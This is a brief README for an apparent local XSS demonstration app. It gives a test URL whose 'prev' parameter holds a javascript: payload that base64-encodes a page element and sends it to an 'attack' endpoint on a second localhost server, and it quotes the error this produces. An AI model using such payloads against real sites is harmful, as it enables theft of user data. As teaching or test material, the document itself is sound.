# XSS (escaping html in url)

## How to run
`node index.js`

## test with
http://localhost:3000/?prev=javascript:(new%20Image().src)=`http://localhost:3001/attack/${btoa(stat.innerHTML)}`,0/

When 'Back to Control HQ' is clicked on
"Cannot GET /javascript:(new%20Image().src)=%60http://localhost:3001/attack/$%7Bbtoa(stat.innerHTML)%7D%60,0//en").
